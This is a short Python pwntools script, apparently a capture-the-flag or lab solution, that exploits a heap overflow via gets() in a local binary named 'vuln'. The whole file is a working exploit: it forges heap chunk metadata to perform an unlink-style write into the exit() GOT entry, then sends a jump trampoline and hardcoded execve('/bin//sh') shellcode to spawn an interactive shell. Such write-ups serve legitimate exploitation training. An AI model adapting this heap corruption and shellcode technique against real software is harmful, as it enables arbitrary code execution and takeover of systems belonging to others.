from pwn import *

# A dynamic version of the static exploit I made earlier.

p = process("./vuln")

p.recvline()

address = int(p.recvline())

# Exploit #1: gets(fullname)

# fullname data
e = 'A'*664

# fullname size (default 0x2a1, only used when freed)
e += p32(0x2a1)

# name size (default 0x49)
e += p32(0x49)

# name bck pointer > MAIN EXPLOIT
# Points into exit() GOT entry, with an offset of 0xc because of the fwd pointer offset.
e += p32(0x0804d020)

# name fwd pointer > MAIN EXPLOIT
# Points into lastname data. The byte at this+0x8 will be overwritten, but that's fine.
e += p32(address + 0x2f8)
print("lastname data: " + str(hex(address + 0x2e8)))

# name data
e += 'N'*56

# name size (only used when freed)
e += p32(0x49)

# lastname size (default 0x49)
# change to 48 to make it seem like name is free
e += p32(0x48)

p.sendline(e)

#-----------------------------------------

# Exploit #2: gets(lastname)

# Padding
e = 'P'*16

# Shellcode to call more shellcode
e += asm('push {} ; ret'.format(hex(address + 0x304)))

# Padding
e += 'P'*6

# Shellcode to execute a shell
e += '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'

p.sendline(e)

print("Shell spawned!")
p.interactive()
